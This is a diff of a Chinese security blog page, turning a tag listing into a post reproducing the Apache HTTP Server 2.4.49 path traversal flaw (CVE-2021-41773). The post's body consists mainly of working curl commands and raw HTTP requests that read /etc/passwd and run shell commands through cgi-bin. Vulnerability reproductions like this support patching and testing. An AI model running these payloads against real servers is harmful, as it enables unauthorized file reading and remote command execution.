@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="标签: CVE-2017-12149, 渗透测试,RedTeam,漏洞复现,信息收集,java,golang,python等">
+    <meta name="keywords" content="Apache HTTP Server 2.4.49 路径穿越漏洞(CVE-2021-41773), 渗透测试,RedTeam,漏洞复现,信息收集,java,golang,python等">
     <meta name="description" content="专注于RedTeam,分享生活,分享知识">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -17,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>标签: CVE-2017-12149 | Taoing&#39;s Blog</title>
+    <title>Apache HTTP Server 2.4.49 路径穿越漏洞(CVE-2021-41773) | Taoing&#39;s Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -306,210 +306,400 @@
 
 </header>
 
-    <div class="bg-cover pd-header about-cover">
-    <div class="container">
-    <div class="row">
-    <div class="col s10 offset-s1 m8 offset-m2 l8 offset-l2">
-        <div class="brand">
-            <div class="title center-align">
-                
-                技术永无止境
-                
-            </div>
-
-            <div class="description center-align">
-                
-                <span id="subtitle"></span>
-                <script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11"></script>
-                <script>
-                    var typed = new Typed("#subtitle", {
-                        strings: [ 
-                            
-                                "万丈高楼平地起, 勿在浮沙筑高台",
-                            
-                                "万丈高楼平地起, 勿在浮沙筑高台",
-                            
-                        ],
-                        startDelay: 300,
-                        typeSpeed: 100,
-                        loop: true,
-                        backSpeed: 50,
-                        showCursor: true
-                    });
-                </script>
-                
-            </div>
-        </div>
-    </div>
-</div>
-
-
+    
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
 <script>
-    // 每天切换 banner 图.  Switch banner image every day.
-    var bannerUrl = "/medias/banner/" + new Date().getMinutes() + '.jpg';
-    $('.bg-cover').css('background-image', 'url(/medias/banner/' + new Date().getMinutes() + '.jpg)');
-
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
 </script>
 
 
-    </div>
-</div>
 
-<main class="content">
 
-    
-
-<div id="tags" class="container chip-container">
-    <div class="card">
-        <div class="card-content">
-            <div class="tag-title center-align">
-                <i class="fas fa-tags"></i>&nbsp;&nbsp;文章标签
-            </div>
-            <div class="tag-chips">
-                
-                
-                <a href="/tags/Apache-HTTPD/" title="Apache HTTPD: 2">
-                    <span class="chip center-align waves-effect waves-light
-                             chip-default "
-                            data-tagname="Apache HTTPD" style="background-color: #F9EBEA;">Apache HTTPD
-                        <span class="tag-length">2</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/tags/CVE-2021-41773/" title="CVE-2021-41773: 1">
-                    <span class="chip center-align waves-effect waves-light
-                             chip-default "
-                            data-tagname="CVE-2021-41773" style="background-color: #F5EEF8;">CVE-2021-41773
-                        <span class="tag-length">1</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/tags/JBOSS/" title="JBOSS: 3">
-                    <span class="chip center-align waves-effect waves-light
-                             chip-default "
-                            data-tagname="JBOSS" style="background-color: #D5F5E3;">JBOSS
-                        <span class="tag-length">3</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/tags/CVE-2017-7504/" title="CVE-2017-7504: 1">
-                    <span class="chip center-align waves-effect waves-light
-                             chip-default "
-                            data-tagname="CVE-2017-7504" style="background-color: #E8F8F5;">CVE-2017-7504
-                        <span class="tag-length">1</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/tags/weblogic/" title="weblogic: 1">
-                    <span class="chip center-align waves-effect waves-light
-                             chip-default "
-                            data-tagname="weblogic" style="background-color: #FEF9E7;">weblogic
-                        <span class="tag-length">1</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/tags/CVE-2020-14750/" title="CVE-2020-14750: 1">
-                    <span class="chip center-align waves-effect waves-light
-                             chip-default "
-                            data-tagname="CVE-2020-14750" style="background-color: #F8F9F9;">CVE-2020-14750
-                        <span class="tag-length">1</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/tags/CVE-2020-14882/" title="CVE-2020-14882: 1">
-                    <span class="chip center-align waves-effect waves-light
-                             chip-default "
-                            data-tagname="CVE-2020-14882" style="background-color: #82E0AA;">CVE-2020-14882
-                        <span class="tag-length">1</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/tags/CVE-2020-14883/" title="CVE-2020-14883: 1">
-                    <span class="chip center-align waves-effect waves-light
-                             chip-default "
-                            data-tagname="CVE-2020-14883" style="background-color: #D7BDE2;">CVE-2020-14883
-                        <span class="tag-length">1</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/tags/CVE-2017-15715/" title="CVE-2017-15715: 1">
-                    <span class="chip center-align waves-effect waves-light
-                             chip-default "
-                            data-tagname="CVE-2017-15715" style="background-color: #A3E4D7;">CVE-2017-15715
-                        <span class="tag-length">1</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/tags/CVE-2017-12149/" title="CVE-2017-12149: 1">
-                    <span class="chip center-align waves-effect waves-light
-                             chip-active "
-                            data-tagname="CVE-2017-12149" style="background-color: #85C1E9;">CVE-2017-12149
-                        <span class="tag-length">1</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/tags/JBOSS%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AEGetshell/" title="JBOSS未授权访问Getshell: 1">
-                    <span class="chip center-align waves-effect waves-light
-                             chip-default "
-                            data-tagname="JBOSS未授权访问Getshell" style="background-color: #F8C471;">JBOSS未授权访问Getshell
-                        <span class="tag-length">1</span>
-                    </span>
-                </a>
-                
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/21.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">Apache HTTP Server 2.4.49 路径穿越漏洞(CVE-2021-41773)</h1>
+                </div>
             </div>
         </div>
     </div>
 </div>
 
+
+
+
+<main class="container content">
+
+    
+    <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/Apache-HTTPD/">
+                                <span class="chip bg-color">Apache HTTPD</span>
+                            </a>
+                        
+                            <a href="/tags/CVE-2021-41773/">
+                                <span class="chip bg-color">CVE-2021-41773</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
+                                漏洞复现
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2021-10-09
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2021-10-09
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    483
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    2 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="Apache-HTTP-Server-2-4-49-路径穿越漏洞-CVE-2021-41773"><a href="#Apache-HTTP-Server-2-4-49-路径穿越漏洞-CVE-2021-41773" class="headerlink" title="Apache HTTP Server 2.4.49 路径穿越漏洞(CVE-2021-41773)"></a>Apache HTTP Server 2.4.49 路径穿越漏洞(CVE-2021-41773)</h2><h3 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h3><p>Apache HTTP Server是Apache基金会开源的一款流行的HTTP服务器。在其2.4.49版本中，引入了一个路径穿越漏洞，满足下面两个条件的Apache服务器将会受到影响：<br>版本等于2.4.49<br>穿越的目录允许被访问，比如配置了<Directory />Require all granted</Directory>。（默认情况下是不允许的）<br>攻击者利用这个漏洞，可以读取位于Apache服务器Web目录以外的其他文件，或者读取Web目录中的脚本文件源码，或者在开启了cgi或cgid的服务器上执行任意命令。</p>
+<p><strong>参考链接：</strong></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://httpd.apache.org/security/vulnerabilities_24.html">https://httpd.apache.org/security/vulnerabilities_24.html</a></li>
+<li><a target="_blank" rel="noopener" href="https://twitter.com/ptswarm/status/1445376079548624899">https://twitter.com/ptswarm/status/1445376079548624899</a></li>
+<li><a target="_blank" rel="noopener" href="https://twitter.com/HackerGautam/status/1445412108863041544">https://twitter.com/HackerGautam/status/1445412108863041544</a></li>
+<li><a target="_blank" rel="noopener" href="https://twitter.com/snyff/status/1445565903161102344">https://twitter.com/snyff/status/1445565903161102344</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/httpd/CVE-2021-41773/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/httpd/CVE-2021-41773/README.zh-cn.md</a></li>
+</ul>
+<h3 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h3><p>使用如下CURL命令来发送Payload（注意其中的/icons/必须是一个存在且可访问的目录）：<br><code>curl -v --path-as-is http://your-ip:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</code></p>
+<pre class="line-numbers language-none"><code class="language-none">GET &#x2F;&#x2F;icons&#x2F;.%2e&#x2F;%2e%2e&#x2F;%2e%2e&#x2F;%2e%2e&#x2F;etc&#x2F;passwd HTTP&#x2F;1.1
+Host: 106.55.147.147:8080
+User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko&#x2F;20100101 Firefox&#x2F;91.0
+Accept: *&#x2F;*
+Accept-Language: zh-CN,en;q&#x3D;0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Pragma: no-cache
+Cache-Control: no-cache<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/2871523259279.png"></p>
+<p>在服务端开启了cgi或cgid这两个mod的情况下，这个路径穿越漏洞将可以执行任意命令：<br><code>curl -v --data &quot;echo;id&quot; &#39;http://your-ip:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh&#39;</code><br><code>curl -v --data &quot;echo;id&quot; -x 127.0.0.1:8080 &#39;http://106.55.147.147:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh&#39;</code><br>-x 代表代理</p>
+<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;cgi-bin&#x2F;.%2e&#x2F;.%2e&#x2F;.%2e&#x2F;.%2e&#x2F;bin&#x2F;sh HTTP&#x2F;1.1
+Host: Your ip:8080
+User-Agent: curl&#x2F;7.64.1
+Accept: *&#x2F;*
+Content-Length: 7
+Content-Type: application&#x2F;x-www-form-urlencoded
+Connection: close
+
+echo;id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/198315816802.png"></p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Taoing</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://Ta0ing.github.io/article/3ec89881.html">http://Ta0ing.github.io/article/3ec89881.html</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">Taoing</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/Apache-HTTPD/">
+                                    <span class="chip bg-color">Apache HTTPD</span>
+                                </a>
+                            
+                                <a href="/tags/CVE-2021-41773/">
+                                    <span class="chip bg-color">CVE-2021-41773</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
     
 
-    <article id="articles" class="container articles">
-        <div class="row tags-posts">
-            
-            
-            <div class="article tag-post col s12 m6 l4" data-tags="JBOSS, CVE-2017-12149" data-aos="fade-up">
-                <div class="card">
-                    <a href="/article/c3936183.html">
-                        <div class="card-image tag-image">
-                            
-                            
-                            <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="JBOSS CVE-2017-12149">
-                            
-                            <span class="card-title">JBOSS CVE-2017-12149</span>
-                        </div>
-                    </a>
-                    <div class="card-content article-content">
-                        <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-05
-                            </span>
-                            <span class="publish-author">
-                                
-                                <i class="fas fa-bookmark fa-fw icon-category"></i>
-                                
-                                <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
-                                漏洞复现
-                                </a>
-                                
-                                
-                            </span>
-                        </div>
-                    </div>
+    
+
+</div>
+
                 </div>
             </div>
             
         </div>
-    </article>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/article/1c1cce96.html">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="apache 解析漏洞（CVE-2017-15715)">
+                        
+                        <span class="card-title">apache 解析漏洞（CVE-2017-15715)</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，1.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-10-09
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
+                                    漏洞复现
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Apache-HTTPD/">
+                        <span class="chip bg-color">Apache HTTPD</span>
+                    </a>
+                    
+                    <a href="/tags/CVE-2017-15715/">
+                        <span class="chip bg-color">CVE-2017-15715</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/article/45a5e5d3.html">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="Jboss CVE-2017-7504">
+                        
+                        <span class="card-title">Jboss CVE-2017-7504</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-05
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
+                                    漏洞复现
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/JBOSS/">
+                        <span class="chip bg-color">JBOSS</span>
+                    </a>
+                    
+                    <a href="/tags/CVE-2017-7504/">
+                        <span class="chip bg-color">CVE-2017-7504</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    
+
 </main>
 
 
